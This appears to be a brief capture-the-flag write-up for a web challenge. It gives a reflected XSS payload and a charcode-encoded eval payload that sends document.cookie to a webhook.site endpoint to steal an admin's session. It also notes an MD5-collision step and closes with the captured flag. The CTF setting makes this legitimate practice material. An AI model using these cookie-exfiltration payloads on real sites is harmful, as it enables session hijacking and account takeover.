Reflected XSS payload: http://159.65.249.122:3000/#|javascript:alert('XSS')|http://159.65.249.122:3000/|\||\\

Send this XSS on "http://159.65.249.122:3000/contact" to get admin's cookies:

Ps: You need to create a md5 hash collision with four bytes given in /contact
  MD5 hash collision python script: https://gist.github.com/EffectRenan/2425aa1ab52e35f6f8ee8b31b2582d65
  Execution: python2 MD5-collision.py "<Bytes_Given>" 0

Charcode encoder: https://codepen.io/HerbertAnchovy/pen/XLzdYr
I used https://webhook.site/ to receive the cookies.
Encode to charCode: window.location="<Your_Webhook_Link>/?Cookie="+document.cookie

Payload: http://159.65.249.122:3000/#|javascript:eval(String.fromCharcode(<Charcode_Encoded>))|http://159.65.249.122:3000/|\||\\

Flag: https://webhook.site/<...>/?Cookie=token=HACKAFLAG{T1m3_t0_r3st4rt}
